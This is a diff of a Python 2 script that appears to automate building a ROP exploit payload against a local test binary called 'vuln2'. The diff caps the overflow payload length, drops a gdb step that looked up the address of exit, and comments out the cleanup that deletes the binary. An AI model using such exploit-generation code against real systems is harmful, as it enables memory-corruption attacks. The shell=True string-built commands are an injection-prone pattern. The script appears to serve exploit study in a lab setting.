@@ -976,24 +976,15 @@ def find_library_base_addr(vuln_binary, library_path):
 
 def find_buffer_addr(vuln_binary, payload_length):
     test_program_to_find_buf_addr()
+    if payload_length > 424:
+        payload_length = 424
 
     cmd = "./vuln2 " + "A"*payload_length + "|grep \"Address of buf\"|awk '{print $5}'"
-    if payload_length > 424:
-        rem = (payload_length - 424)/4
-        with io.FileIO("find_exit.gdb", "w") as file:
-            file.write("b main\nrun hello\np/x &exit\n")
-        gdb_cmd = "gdb --batch --command=./find_exit.gdb --args ./vuln2 hello|tail -1|awk '{print $3}'"
-        gproc = subprocess.Popen(gdb_cmd, shell=True, stdout=subprocess.PIPE)
-        gproc.wait()
-        eaddr = gproc.stdout.read()
-        print eaddr
-        exit_addr = int(eaddr, 16)
-        cmd = "./vuln2 " + "A"*424 +  rem * pack_value(exit_addr) + "|grep \"Address of buf\"|awk '{print $5}'"
+
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
     proc.wait()
     try:
         baddr = proc.stdout.read()
-        print baddr
         buffer_addr = int(baddr, 16)
         return buffer_addr
     except Exception as e:
@@ -1091,9 +1082,9 @@ if __name__ == '__main__':
             print '===============================================================\n'
 
 
-    rm_command = "rm -rf ./vuln2 ./vuln2.c"
-    rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
-    rmproc.wait()
+    #rm_command = "rm -rf ./vuln2 ./vuln2.c"
+    #rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
+    #rmproc.wait()
 
     if result == True: 
         print_rop_payload(rop_payload)
